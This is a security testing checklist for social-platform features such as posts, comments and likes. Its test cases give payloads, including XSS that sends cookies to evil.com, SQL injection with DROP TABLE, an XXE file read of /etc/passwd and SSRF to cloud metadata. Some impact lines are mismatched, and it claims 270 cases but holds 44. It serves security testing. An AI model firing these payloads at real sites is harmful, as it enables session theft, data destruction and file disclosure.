# 8. Social & Community — Checklist

Feature-area security **test cases** for “8. Social & Community”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*270 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## SOC-001 — Stored XSS in Post Body
**Test Category:** Cross-Site Scripting · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create new post 2. Enter XSS payload in post body 3. Submit post 4. View post as another user 5. Check for script execution

**Expected Result:** Application should sanitize and encode all user-generated content

**Payload Example:**

```
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-002 — Stored XSS in Post Title
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create post with XSS in title 2. Submit post 3. View in feed 4. Check for execution in title display

**Expected Result:** Title should be sanitized before storage and display

**Payload Example:**

```
<img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-003 — DOM XSS via Post Content
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Analyze JavaScript handling of post content 2. Craft DOM XSS payload 3. Create post with payload 4. Trigger DOM manipulation

**Expected Result:** Client-side code should sanitize before DOM insertion

**Payload Example:**

```
<div id="x" onclick="alert(1)">click</div> or javascript:alert(1)
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / DOM Invader / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-004 — SQL Injection in Post Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Search for posts 2. Inject SQL payload in search parameter 3. Observe response for SQL errors 4. Extract database data

**Expected Result:** Application should use parameterized queries

**Payload Example:**

```
search=' OR '1'='1'-- or search='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / Havij

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-005 — NoSQL Injection in Post Query
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Filter posts by criteria 2. Inject NoSQL operators 3. Bypass filters 4. Access unauthorized posts

**Expected Result:** NoSQL queries should be properly sanitized

**Payload Example:**

```
{"author":{"$ne":null},private:{"$exists":false}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite / MongoDB Compass

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## SOC-006 — IDOR on Post Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create private post 2. Note post_id 3. Logout and access post URL 4. Access as different user

**Expected Result:** Private posts should verify authorization

**Payload Example:**

```
GET /api/posts/private_post_id or /posts/victim_private_post
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-007 — IDOR on Post Edit
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Edit own post 2. Intercept request 3. Change post_id to another user's post 4. Modify victim's content

**Expected Result:** Application should verify post ownership

**Payload Example:**

```
PUT /api/posts/victim_post_id {"content":"hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-008 — IDOR on Post Deletion
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Delete own post 2. Intercept DELETE request 3. Modify post_id 4. Delete another user's post

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/posts/victim_post_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-009 — CSRF on Post Creation
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create malicious page with post form 2. Auto-submit on victim visit 3. Post created on victim's behalf

**Expected Result:** Post creation should require CSRF token

**Payload Example:**

```
<form action="https://target.com/posts" method="POST"><input name="content" value="spam"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-010 — Post Visibility Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create private/friends-only post 2. Access via direct API 3. Bypass visibility restrictions

**Expected Result:** Visibility should be enforced at API level

**Payload Example:**

```
GET /api/posts/private_id?bypass_privacy=true
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-011 — Mass Assignment on Post
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create post 2. Add extra parameters 3. Modify restricted fields like author_id or is_pinned

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"content":"test",author_id:"admin",is_featured:true,is_pinned:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## SOC-012 — File Upload in Post - Malicious File
**Test Category:** File Upload Vulnerabilities · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create post with media 2. Upload PHP/executable file 3. Access uploaded file 4. Execute code

**Expected Result:** Application should validate file types and content

**Payload Example:**

```
shell.php or shell.php.jpg
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Weevely / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## SOC-013 — File Upload - SVG XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Upload SVG image in post 2. Include JavaScript in SVG 3. View post 4. XSS executes

**Expected Result:** SVG files should be sanitized or converted

**Payload Example:**

```
<svg onload=alert('XSS')></svg>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Custom SVG

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-014 — File Upload - XXE via SVG
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create SVG with XXE payload 2. Upload as post image 3. Server processes SVG 4. Extract files

**Expected Result:** XML parsing should disable external entities

**Payload Example:**

```
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## SOC-015 — File Upload - SSRF via Image URL
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Find image URL upload 2. Provide internal URL 3. Server fetches internal resource

**Expected Result:** Application should validate and restrict URLs

**Payload Example:**

```
image_url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap / Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SOC-016 — Post Rate Limiting Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create posts rapidly 2. Bypass rate limiting 3. Spam platform

**Expected Result:** Rate limiting should prevent spam

**Payload Example:**

```
X-Forwarded-For rotation or parallel requests
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate / Turbo Intruder

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SOC-017 — Post Scheduling Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Schedule post for future 2. Modify scheduled time to past 3. Bypass scheduling restrictions

**Expected Result:** Scheduled times should be validated

**Payload Example:**

```
{"scheduled_at":"2020-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-018 — Draft Post Access IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Save post as draft 2. Intercept draft access 3. Modify draft_id 4. Access others' drafts

**Expected Result:** Draft access should verify ownership

**Payload Example:**

```
GET /api/drafts/victim_draft_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-019 — Post Content Length Bypass
**Test Category:** Input Validation · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Check character limit 2. Bypass client-side validation 3. Submit oversized content

**Expected Result:** Server should enforce content limits

**Payload Example:**

```
content=A*100000 (100000 characters)
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## SOC-020 — Post Metadata Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create post with custom metadata 2. Inject malicious metadata 3. Exploit in meta tags

**Expected Result:** Metadata should be sanitized

**Payload Example:**

```
{"og:image":"javascript:alert(1)"} or meta tag injection
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-021 — Post Location Spoofing
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create post with location 2. Spoof GPS coordinates 3. Appear at fake location

**Expected Result:** Location should be validated if critical

**Payload Example:**

```
{"latitude":40.7128,longitude:-74.0060}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / GPS Spoofing Tools

**References:** CWE-840; PortSwigger Business logic

---

## SOC-022 — Hidden Post Access After Deletion
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create and delete post 2. Access via direct URL 3. View deleted content

**Expected Result:** Deleted posts should be inaccessible

**Payload Example:**

```
GET /api/posts/deleted_post_id
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-023 — Post Edit History Exposure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Edit post multiple times 2. Access edit history API 3. View all revisions

**Expected Result:** Edit history should respect privacy

**Payload Example:**

```
GET /api/posts/123/revisions
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-024 — Server-Side Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Create post with SSTI payload 2. Submit and view post 3. Check for template execution

**Expected Result:** User input should not be processed as templates

**Payload Example:**

```
{{7*7}} or ${7*'7'} or <%= 7*7 %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap / SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## SOC-025 — Markdown/BBCode Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Post / Create Content

**Test Steps:** 1. Find markdown-enabled post 2. Inject XSS via markdown 3. Bypass markdown sanitization

**Expected Result:** Markdown output should be sanitized

**Payload Example:**

```
[link](javascript:alert('XSS')) or ![img](x" onerror="alert(1))
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-026 — Stored XSS in Comment
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Find post to comment on 2. Enter XSS payload in comment 3. Submit comment 4. Victim views post

**Expected Result:** Comments should be sanitized before display

**Payload Example:**

```
<script>fetch('http://evil.com?c='+document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-027 — IDOR on Comment Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Comment on private post 2. Note comment_id 3. Access comment directly 4. Bypass post privacy

**Expected Result:** Comment access should inherit post permissions

**Payload Example:**

```
GET /api/comments/comment_on_private_post
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-028 — IDOR on Comment Edit
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Edit own comment 2. Intercept request 3. Change comment_id 4. Edit victim's comment

**Expected Result:** Comment editing should verify authorship

**Payload Example:**

```
PUT /api/comments/victim_comment_id {"content":"hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-029 — IDOR on Comment Deletion
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Delete own comment 2. Modify comment_id 3. Delete another user's comment

**Expected Result:** Deletion should verify ownership or admin role

**Payload Example:**

```
DELETE /api/comments/victim_comment_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-030 — Comment Nesting Depth Attack
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Find nested comments 2. Create extremely deep nesting 3. Cause rendering issues

**Expected Result:** Comment nesting should have depth limits

**Payload Example:**

```
Reply to reply 1000 levels deep
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-031 — Comment Race Condition
**Test Category:** Race Condition · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Submit same comment rapidly 2. Create duplicate comments 3. Bypass rate limiting

**Expected Result:** Comment submission should be atomic

**Payload Example:**

```
Parallel POST /comments requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SOC-032 — Comment CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Create malicious page 2. Auto-submit comment on victim's behalf 3. Spam posts

**Expected Result:** Comment submission should require CSRF token

**Payload Example:**

```
<form action="/posts/123/comments" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-033 — SQL Injection in Comment
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Submit comment with SQL payload 2. Check for SQL errors 3. Extract data

**Expected Result:** Comments should use parameterized queries

**Payload Example:**

```
comment='; DROP TABLE comments;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-034 — Comment on Locked Post
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Find locked/closed post 2. Attempt to comment via API 3. Bypass lock

**Expected Result:** Locked posts should reject new comments

**Payload Example:**

```
POST /api/posts/locked_post/comments
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-035 — Hidden Comment Exposure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Find hidden/moderated comment 2. Access directly 3. View before moderation

**Expected Result:** Hidden comments should be inaccessible

**Payload Example:**

```
GET /api/comments/hidden_comment_id
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-036 — Reply to Deleted Comment
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Reply to comment 2. Original comment deleted 3. Reply still visible with context

**Expected Result:** Orphaned replies should be handled gracefully

**Payload Example:**

```
Check orphaned reply visibility
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-037 — Comment Notification Bombing
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Mention user in many comments 2. Flood user with notifications 3. DoS via notifications

**Expected Result:** Notification rate should be limited

**Payload Example:**

```
Post 1000 comments mentioning same user
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-038 — Comment Link Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Post comment with link 2. Inject JavaScript URL 3. User clicks malicious link

**Expected Result:** Links should be validated

**Payload Example:**

```
<a href="javascript:alert(1)">click</a> or href="data:text/html,<script>"
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-039 — Comment Pin IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comment / Reply

**Test Steps:** 1. Pin own comment 2. Modify request to pin others' comments 3. Manipulate post display

**Expected Result:** Pin action should verify permissions

**Payload Example:**

```
POST /api/posts/123/pin-comment {"comment_id":"any"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-040 — Like IDOR - Like Others' Posts as Victim
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Like post 2. Intercept request 3. Modify user_id 4. Like as another user

**Expected Result:** Like should use session user only

**Payload Example:**

```
POST /api/posts/123/like {"user_id":"victim_id"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-041 — Unlike IDOR - Remove Others' Likes
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Unlike own like 2. Modify like_id 3. Remove another user's like

**Expected Result:** Unlike should verify like ownership

**Payload Example:**

```
DELETE /api/likes/victim_like_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-042 — Like Count Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Like post 2. Intercept response 3. Modify like count 4. Display fake count

**Expected Result:** Like count should be server-authoritative

**Payload Example:**

```
Response manipulation showing fake counts
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## SOC-043 — Double Like Exploit
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Like post 2. Rapidly like again 3. Register multiple likes

**Expected Result:** Like should be idempotent

**Payload Example:**

```
Rapid POST /api/posts/123/like requests
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## SOC-044 — Like Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Send concurrent like requests 2. Inflate like count 3. Bypass uniqueness constraint

**Expected Result:** Like count should be accurate

**Payload Example:**

```
Parallel like requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

